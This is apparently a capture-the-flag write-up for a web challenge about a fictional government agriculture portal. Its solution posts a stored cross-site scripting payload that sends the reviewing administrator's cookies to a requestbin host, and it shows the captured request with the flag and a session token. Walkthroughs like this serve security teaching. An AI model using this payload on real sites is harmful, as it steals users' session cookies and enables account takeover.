# Government Agriculture Network

## Descrption

Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet,
posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the
shareholders." You wonder if there is a similar concept here.

Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor
or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest
possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and
access to flow like the Xenovian acid streams you used to bathe in as a child.

The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not
knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the
picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop
this from happening. Get more information about this Gubberment thing and stop this atrocity.

You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to
rescue it.

[https://govagriculture.web.ctfcompetition.com/](https://govagriculture.web.ctfcompetition.com/)

## Solution

On the Ministry of Agriculture site we create new posts which are reviewed by an administrator. From this we can guess
that we must steal their cookie. The following payload sends the cookies to our site:

```js
<script>
document.location='http://requestbin.net/r/YOUR_BIN?c=' + document.cookie;
</script>
```

The requestbin showed the following request:

```
GET /r/YOUR_BIN?c=flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
```

Therefore the flag was `CTF{8aaa2f34b392b415601804c2f5f0f24e}`
